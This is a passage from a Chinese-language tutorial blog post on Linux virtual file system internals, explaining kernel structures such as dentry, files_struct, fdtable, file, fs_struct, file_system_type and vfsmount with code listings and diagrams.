class="title">d_lru</span>;</span><span class="comment">/* LRU list */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * d_child and d_rcu can share memory</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">d_child</span>;</span><span class="comment">/* child of parent list */</span></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">d_rcu</span>;</span></span><br><span class="line">&#125; d_u;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">d_subdirs</span>;</span><span class="comment">/* our children */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">d_alias</span>;</span><span class="comment">/* inode alias list */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> d_time;<span class="comment">/* 重置时间 used by d_revalidate */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dentry_operations</span> *<span class="title">d_op</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">super_block</span> *<span class="title">d_sb</span>;</span><span class="comment">/* The root of the dentry tree */</span></span><br><span class="line"><span class="type">void</span> *d_fsdata;<span class="comment">/* fs-specific data */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_PROFILING</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dcookie_struct</span> *<span class="title">d_cookie</span>;</span> <span class="comment">/* cookie, if any */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">int</span> d_mounted;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> d_iname[DNAME_INLINE_LEN_MIN];<span class="comment">/* small names */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>​来看几个比较重要的表项：</p><ul><li><p><code>atomic_t d_count;</code>：引用计数。</p><ul><li><p>对于普通文件，互为硬链接的 n 个文件的 d_count 均为 n，当删除某个文件时，所有硬链接文件的 d_count 均减 1，若 d_count 减为 0 则可以释放该 dentry 结构体和对应的 inode ，否则只可释放 dentry。</p></li><li><p>对于目录文件，不可通过 ln 命令来创建硬链接，但其本身却有硬链接，用 d_count 表示，通过<code>ls -l</code>命令可查看。假设有这样的目录树</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/</span><br><span class="line">|-- file</span><br><span class="line">| |-- test</span><br><span class="line">| |   |-- a.txt</span><br><span class="line">| |   |-- b.txt</span><br><span class="line">| |   |-- f1</span><br><span class="line">| |   |-- f2</span><br></pre></td></tr></table></figure><p>对于 test 目录而言有 4 个硬链接数，1. 通过<code>cd /file/test</code>可进入该目录；2. 通过同级的<code>cd .</code>可进入该目录；3. 通过下级的 f1 文件<code>cd ..</code>可返回该目录；4. 通过下级的 f2 文件<code>cd ..</code>可返回该目录；因此我们也可总结出：一个目录文件的硬链接数至少为2。</p></li></ul></li><li><p><code>struct inode *d_inode;</code>：指向其对应的索引节点 inode。</p></li><li><p><code>unsigned int d_flags; </code>：状态位。有三种状态：</p><ul><li>被使用：意味着它正在被 VFS 使用并指向一个有效的索引节点 inode。（d_inode 有效，d_count &gt;&#x3D; 1）</li><li>未被使用：指向一个有效的索引节点 inode，但 VFS 未使用（d_count &#x3D;&#x3D; 0）。若以后需要则可不必再创建 dentry，但若需回收内存则可撤销该 dentry。</li><li>负状态：无对应索引节点 inode（d_inode &#x3D;&#x3D; NULL），由于索引节点被删除或目录不在正确时导致。</li></ul></li><li><p><code>struct hlist_node d_hash; </code>：哈希链表节点，dentry 被放在哈希链表 dentry_cache 上，方便寻找。</p></li><li><p><code>struct dentry *d_parent; </code>：父目录指针。</p></li><li><p><code>struct qstr d_name;</code>：文件或者是目录的名字。</p></li><li><p><code>struct list_head d_lru; </code>：lru链表。</p></li><li><p><code>union&#123; struct list_head d_child;&#125;</code>：父目录中指向子目录的指针（即兄弟项指针）。</p></li><li><p><code>struct list_head d_subdirs;</code>：子目录链表。</p></li><li><p><code>struct list_head d_alias; </code>：索引节点别名链表。</p></li><li><p><code>struct dentry_operations *d_op;</code>：目录项操作函数指针。包含<code>(*d_hash)</code>，<code>(*d_delete)</code>，<code>(*d_release)</code>等操作。</p></li><li><p><code>struct super_block *d_sb;</code>：所属超级块。</p></li></ul><p>​既然这里我们这里谈的是文件在内存中的组织形式，当然也就少不了谈起和进程的关系，毕竟操作文件的主体肯定是进程而不是空气。与此相关联的我们要看三个结构体：<code>struct file</code>，<code>struct files_struct</code>以及<code>struct fs_struct</code>。</p><p>​我们从前往后看，首先我们知道 Linux 下描述进程的结构体是 task_struct （如果对这个还不了解的话先去搜一搜进程控制块和 task_struct 的概念），在 task_struct 里有一项 <code>struct files_struct *files;</code>，其指向描述本进程的打开文件表，注意，这描述的是进程打开的所有文件的总表，其中有一项为 <code>struct file ** fd;</code>，它是一个指针数组，数组的每一项指向一个打开的文件对象结构体，也就是我们要谈到的<code>struct file</code>，它针对的是单个文件。而对一个文件来说，我们便不难猜到了，<code>struct file</code>里有一项为<code>struct dentry *f_dentry;</code>，这就是指向该文件的 dentry 结构体的成员，这样，我们的知识便串联了起来。</p><p>​此外，上面的 file 和 files_struct 记录的都是进程打开的文件信息，但是对于进程来说，自身的一些信息用什么表示呢，这里就涉及到 fs_struct 结构体。比如我们在 <code>/home/bingbing/code1</code>下执行<code>./a.out</code>，那么作为进程的执行文件<code>a.out</code>本身也需要描述，这就是 task_struct 里的<code>struct fs_struct *fs</code>，其指向一个 fs_struct 结构体，fs_struct 里的比如<code>struct dentry * pwd;</code>描述的便是进程当前的执行目录的 dentry。这样，我们就把这几个结构体讲完了。来看看，千言万语汇成一幅图：</p><p><img src="https://s2.loli.net/2023/01/17/sAoiTm9Ctv2Pk4r.jpg" alt="P_WCNS_1@_A~G4C@BPAX_KS.jpg"></p><h2 id="用户打开文件表（files-struct）"><a href="#用户打开文件表（files-struct）" class="headerlink" title="用户打开文件表（files_struct）"></a>用户打开文件表（files_struct）</h2><p>​当我们创建文件时，操作系统会为指向该文件的指针 FILE* 关联一个文件描述符 fd 并添加在文件描述符表中。在文件描述符表中 fd 相当于数组的索引。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">files_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">atomic_t</span> count;</span><br><span class="line">    <span class="type">rwlock_t</span> file_lock; <span class="comment">/*保护以下的所有域,以免在 tsk-&gt;alloc_lock 中的嵌套*/</span></span><br><span class="line">    <span class="type">int</span> next_fd;<span class="comment">/*已分配的最大文件描述符+1*/</span></span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fdtable</span> *<span class="title">fdt</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fdtable</span>  <span class="title">fdtab</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">embedded_fd_set</span> <span class="title">close_on_exec_init</span>;</span> <span class="comment">/*执行exec( )时需要关闭的文件描述符的初值集合*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">embedded_fd_set</span> <span class="title">open_fds_init</span>;</span><span class="comment">/*文件描述符的初值集合*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">fd_array</span>[<span class="title">NR_OPEN_DEFAULT</span>];</span><span class="comment">/*文件对象指针数组*/</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>​下面有一些比较重要的成员。</p><ul><li><code>atomic_t count;</code>是引用计数，表示共享该表的进程数。</li><li><code>int next_fd;</code>：已分配的最大文件描述符+1，即下一个可用的 fd。</li><li><code>struct fdtable *fdt</code>： 指向其他 fd 表的指针。</li><li><code>struct fdtable fdtab</code>： 基 fd 表。</li><li><code>struct file *fd_array[NR_OPEN_DEFAULT];</code>：缺省的文件对象数组。</li></ul><p>​<code>fd_array[NR_OPEN_DEFAULT]</code> 数组中存储了 <code>struct file *</code>类型的数据，也就是指向已打开的文件对象，其中的宏<code>NR_OPEN_DEFAULT</code>定义等于计算机位数，在64位机器上为64，换句话说，一个进程的 <code>files_struct</code> 结构体最多能打开64个文件对象，大家肯定就会问，那超过64个怎么办呢？没错，这时候就需要用到 <code>fdtable</code> 了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fdtable</span> &#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> max_fds;<span class="comment">/*当前文件对象的最大数*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> __<span class="title">rcu</span> **<span class="title">fd</span>;</span>      <span class="comment">/* current fd array */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> *close_on_exec;<span class="comment">/*指向 执行exec( )时需要关闭的文件描述符*/</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> *open_fds;<span class="comment">/*指向 打开的文件描述符*/</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> *full_fds_bits;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>​从<code>struct fdtable</code>的源代码里可以看到该结构体内最值得关注的是<code>struct file __rcu **fd;</code>，这是一个二级指针，也就是说它是一个指针，它指向的对象的数据类型为<code>struct file *</code>，也就是对应的文件对象指针，实际上就是指向我们前面提到的<code>struct file *fd_array[NR_OPEN_DEFAULT];</code>这个成员（而我们通常提到的文件描述符 fd 其实就是该数组的下标索引，因此每个进程的文件描述符相互独立存在）。看一下下面这个图（红色和蓝色箭头表示指针，而灰色虚线表示展开某成员的细节）。</p><blockquote><p>小补充：<code>struct file __rcu **fd;</code>里的 _rcu 是什么? 参考：<a href="https://zhuanlan.zhihu.com/p/113999842">rcu 机制简介 - 知乎</a></p></blockquote><p><img src="https://s2.loli.net/2023/01/17/rdngluIqtKZ3HT7.png" alt="image.png"></p><p>​对于以上的描述，我们可以来看一看对于内核第一个进程(即进程 init )的 <code>files_struct</code> 静态初始化代码，注意第 2 行和第 6 行：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">files_struct</span> <span class="title">init_files</span> =</span> &#123;</span><br><span class="line">    .count      = ATOMIC_INIT(<span class="number">1</span>),</span><br><span class="line">    .fdt        = &amp;init_files.fdtab,</span><br><span class="line">    .fdtab      = &#123;</span><br><span class="line">        .max_fds        = NR_OPEN_DEFAULT,</span><br><span class="line">        .fd               = &amp;init_files.fd_array[<span class="number">0</span>],</span><br><span class="line">        .close_on_exec  = (fd_set *)&amp;init_files.close_on_exec_init,</span><br><span class="line">        .open_fds       = (fd_set *)&amp;init_files.open_fds_init,</span><br><span class="line">        .rcu            = RCU_HEAD_INIT,</span><br><span class="line">    &#125;,</span><br><span class="line">    .file_lock  = __SPIN_LOCK_UNLOCKED(init_task.file_lock),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>​这样一看大家问题就来了，感觉 <code>struct fdtable fdtab</code>没有存在的意义呀，即使去除该结构，也足以表达<code>files_struct</code>。注意，咱们前面说了，64位机<code>file_array</code>至多能存64个文件对象，当进程打开的文件数超过 64 时，操作系统就会新建一个<code>struct fdtable</code>（假定命名为 fdt1）以及一个<code>file_array</code>数组，而此时我们的<code>files_struct</code>里的<code>struct fdtable *fdt;</code>便会指向这个新表<code>fdt1</code>，此时<code>fdt1</code>的<code>struct file __rcu **fd;</code>成员就不是没有意义了，它会指向那块新建的 <code>file_array</code>数组，自此，这些所有的文件对象指针就能被串联起来了。如下图所示。</p><p><img src="https://s2.loli.net/2023/01/17/Qlz4bckN5hrTHPg.png" alt="image.png"></p><h2 id="文件对象（file）"><a href="#文件对象（file）" class="headerlink" title="文件对象（file）"></a>文件对象（file）</h2><p>​<code>files_struct</code>结构体表征的是进程打开的所有文件的集合描述，而该 <code>file</code>结构体则是对单个被打开文件的文件的描述，也称为‘’文件对象‘’。该对象由相应的 open() 系统调用创建，由 close() 撤销。由于多个进程可以同时打开同一个物理文件，因此同一个磁盘文件可以对应多个文件对象，下面来看一下<code>struct file</code>的定义，其位于<code>linux/fs.h</code>中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> &#123;</span></span><br><span class="line">    <span class="comment">// fu_list becomes invalid after file_free is called and queued via</span></span><br><span class="line">    <span class="comment">// fu_rcuhead for RCU freeing</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">fu_list</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>     <span class="title">fu_rcuhead</span>;</span><span class="comment">//与 rcu 机制有关，前面有链接</span></span><br><span class="line">    &#125; f_u;</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">path</span>     <span class="title">f_path</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> f_dentry    f_path.dentry</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> f_vfsmnt    f_path.mnt</span></span><br><span class="line">    </span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span>    *<span class="title">f_op</span>;</span></span><br><span class="line">    <span class="type">spinlock_t</span>      f_lock;  <span class="comment">/* f_ep_links, f_flags, no IRQ */</span></span><br><span class="line">    <span class="type">atomic_long_t</span>       f_count;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>        f_flags;</span><br><span class="line">    <span class="type">fmode_t</span>         f_mode;</span><br><span class="line">    <span class="type">loff_t</span>          f_pos;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fown_struct</span>  <span class="title">f_owner</span>;</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span>   *<span class="title">f_cred</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file_ra_state</span>    <span class="title">f_ra</span>;</span></span><br><span class="line"></span><br><span class="line">    u64         f_version;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">    <span class="type">void</span>            *f_security;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">/* needed for tty driver, and maybe others */</span></span><br><span class="line">    <span class="type">void</span>            *private_data;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_EPOLL</span></span><br><span class="line">    <span class="comment">/* Used by fs/eventpoll.c to link all the hooks to this file */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">f_ep_links</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* #ifdef CONFIG_EPOLL */</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">address_space</span>    *<span class="title">f_mapping</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_WRITECOUNT</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> f_mnt_write_state;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>​下面来看几个比较重要的成员：</p><ul><li><p><code>struct list_head    fu_list;</code>：文件对象链表，所有文件对象被串起来方便遍历和查找。</p></li><li><p><code>struct path     f_path;</code>：描述文件对象的路径，其中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">path</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vfsmount</span> *<span class="title">mnt</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">dentry</span>;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>struct vfsmount *mnt;</code>时和挂载点有关的结构体，后面有介绍，<code>struct dentry *dentry;</code>则是指向该文件对象的 dentry 。</p></li><li><p><code>const struct file_operations    *f_op;</code>：同样的，指文件对象的操作函数指针，包含<code>(*read)</code>，<code>(*write)</code>，<code>(*open)</code>，<code>(*llseek)</code>等我们非常熟悉的文件操作。</p></li><li><p><code>atomic_long_t       f_count;</code>：文件对象引用计数，即当前有多少个进程在使用该文件。</p></li><li><p><code>unsigned int        f_flags;</code>：打开文件时所指定的标志。</p></li><li><p><code>fmode_t         f_mode;</code>：文件访问模式，如只读，只写等，掩码表示。</p></li><li><p><code>loff_t          f_pos;</code>：文件当前的位移量（文件指针）。</p></li><li><p><code>struct fown_struct  f_owner;</code>：文件所有者信息，包含 uid，gid等。</p></li><li><p><code>struct inode    *f_inode;</code>：通常我们认为 file 文件对象需要通过 dentry 才能找到对应的 inode，但当今的 Linux 实现或也有此成员，可快速找到作为 cached value 的 inode结构体。</p></li></ul><p>​不难发现，文件对象并不记录文件是否为脏等标志，因为文件对象并没有对应的磁盘数据。文件对象通过 f_dentry 指针找到对应的 dentry 结构体，再找到 inode 节点，而我们前面已经看到，在 inode 里记录着最后一次访问，修改文件，修改 inode 时间，以决定是否回写进磁盘。</p><p>​在 Linux 中，系统会为每个进程打开三个默认文件，即标准输入 STDIN_FILENO，标准输出 STDOUT_FILENO以及标准错误 STDERR_FILENO，因此当我们的进程打开一个自己的文件时，系统为指向该文件的指针 FILE* 关联一个文件描述符并添加在文件描述符表中，这个描述符一般就从 3 开始了。</p><p><img src="https://s2.loli.net/2023/01/18/9kfFGxYRzHgMhsU.png" alt="image.png"></p><h2 id="fs-strucut"><a href="#fs-strucut" class="headerlink" title="fs_strucut"></a>fs_strucut</h2><p>​除了前面提到的进程打开的文件之外，每个进程也都有自己的根目录和当前工作目录，内核使用<code>struct fs_struct</code>来记录这些信息，进程描述符 <code>task_struct</code>的 fs 字段便是指向该进程的 <code>fs_struct</code> 结构。这个结构体就很简单了，下面来看一下定义，存在于<code>/linux/fs_struct.h</code>中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fs_struct</span> &#123;</span></span><br><span class="line">    <span class="type">atomic_t</span> count;</span><br><span class="line">    <span class="type">int</span> users;<span class="comment">//暂时不清楚</span></span><br><span class="line">    <span class="type">spinlock_t</span> lock;<span class="comment">/*保护该结构体的锁*/</span></span><br><span class="line">    <span class="type">seqcount_t</span> seq;</span><br><span class="line">    <span class="type">int</span> umask;</span><br><span class="line">    <span class="type">int</span> in_exec;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">path</span> <span class="title">root</span>, <span class="title">pwd</span>, <span class="title">altroot</span>;</span></span><br><span class="line"> &#125;;</span><br></pre></td></tr></table></figure><ul><li><code>int umask;</code>：文件访问权限掩码表示，由 umask() 系统调用使用。</li><li><code>atomic_t count;</code>：引用计数，表示共享该表的进程（线程）数。</li><li><code>struct path root, pwd, altroot;</code>：<code>path</code>结构体前面已经提到了，这三个成员就记录了该进程执行目录，进程根目录，用户设置的替换目录 所指向的 dentry 目录项对象。</li></ul><p>​到这里我们就分析完所有我们前面所提到的结构体了，友友们应该也对文件系统体系有了一个框架性的认识，下图总结了这几个重要结构体之间的关系。</p><p><img src="https://s2.loli.net/2023/01/18/NUywPjBTEYSWiaV.png" alt="image.png"></p><h1 id="和文件系统相关的其他标准结构"><a href="#和文件系统相关的其他标准结构" class="headerlink" title="和文件系统相关的其他标准结构"></a>和文件系统相关的其他标准结构</h1><p>​除了以上几种 VFS 架构的基础对象之外，内核还使用了另外一些标准数据结构来管理文件系统的其他相关数据。</p><h2 id="文件系统类型（file-system-type）"><a href="#文件系统类型（file-system-type）" class="headerlink" title="文件系统类型（file_system_type）"></a>文件系统类型（file_system_type）</h2><p>​在前面的超级块<code>struct super_block</code>里，有一个成员是<code>struct file_system_type   *s_type;</code>表示文件系统类型结构体（比如是 EXT2 还是 FAT32），里边是对文件系统的细节描述。因此<code>file_system_type</code>结构用于描述具体的文件系统的类型信息。被 Linux 支持的文件系统，不管它有零个或多个实例被安装到系统中，同类型的文件系统都有且仅有一 个<code>file_system_type</code>结构，其定义于<code>linux/fs.h</code>中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_system_type</span> &#123;</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line"><span class="type">int</span> fs_flags;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> (*get_sb) (<span class="keyword">struct</span> file_system_type *, <span class="type">int</span>, <span class="type">const</span> <span class="type">char</span> *, <span class="type">void</span> *, <span class="keyword">struct</span> vfsmount *);</span><br><span class="line">    <span class="type">void</span> (*kill_sb) (<span class="keyword">struct</span> super_block *);</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_system_type</span> * <span class="title">next</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span> <span class="title">fs_supers</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 锁相关</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">lock_class_key</span> <span class="title">s_lock_key</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">lock_class_key</span> <span class="title">s_umount_key</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">lock_class_key</span> <span class="title">s_vfs_rename_key</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">lock_class_key</span> <span class="title">s_writers_key</span>[<span class="title">SB_FREEZE_LEVELS</span>];</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">lock_class_key</span> <span class="title">i_lock_key</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">lock_class_key</span> <span class="title">i_mutex_key</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">lock_class_key</span> <span class="title">i_mutex_dir_key</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><code>const char *name;</code>：文件系统名称。</li><li><code>int fs_flags;</code>：文件系统类型标志的 bitmap。</li><li><code>int (*get_sb) (xx)</code>：方法，安装文件时会调用 <code>get_sb()</code> 从磁盘中读取超级块。</li><li><code> void (*kill_sb) (struct super_block *);</code>方法，卸载文件系统时会调用此函数做一些清理工作。</li><li><code>struct module *owner;</code>：文件系统模块。</li><li><code>struct file_system_type * next;</code>：指向下一个文件系统类型的<code>file_system_type </code>结构体。</li><li><code>struct hlist_head fs_supers;</code>：同一种文件类型的超级块形成一个链表，<code>fs_supers</code> 是这个链表的头。</li></ul><p>​   不同类型的文件系统通过 <code>next</code> 字段形成一个链表，同一种文件系统类型的超级块通过 <code>s_instances</code> 字段连接在一起，并挂入 <code>fs_supers</code> 链表中。所有的 vfsmount 通过 mnt_list 字段形成一个链表。</p><h2 id="安装点（vfsmount）"><a href="#安装点（vfsmount）" class="headerlink" title="安装点（vfsmount）"></a>安装点（vfsmount）</h2><p>​<code>file_system_type</code>结构用于描述具体的文件系统的类型信息，而<code>vfsmount</code>便是某个文件系统的具体实例。例如 EXT2 类型的文件系统有 5 个，那么<code>file_system_type</code>结构体只有一个，描述 EXT2 信息，而<code>vfsmount</code>会被创建五个，用于描述安装的每一个 EXT2 实例，也被称为安装点，定义于<code>linux/mount.h</code>中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vfsmount</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">mnt_hash</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vfsmount</span> *<span class="title">mnt_parent</span>;</span><span class="comment">/* fs we are mounted on */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">mnt_mountpoint</span>;</span><span class="comment">/* dentry of mountpoint */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">mnt_root</span>;</span><span class="comment">/* root of the mounted tree */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">super_block</span> *<span class="title">mnt_sb</span>;</span><span class="comment">/* pointer to superblock */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">mnt_mounts</span>;</span><span class="comment">/* list of children, anchored here */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">mnt_child</span>;</span><span class="comment">/* and going through their mnt_child */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 安装标志 */</span></span><br><span class="line"><span class="type">int</span> mnt_flags;</span><br><span class="line"><span class="comment">/* 挂载的设备名字，如/dev/dsk/hda1 */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *mnt_devname;</span><br><span class="line">    </span><br><span class="line"><span class="comment">/* 虚拟文件系统命名空间中的链表节点 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">mnt_list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">mnt_expire</span>;</span><span class="comment">/* link in fs-specific expiry list */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">mnt_share</span>;</span><span class="comment">/* circular list of shared mounts */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span 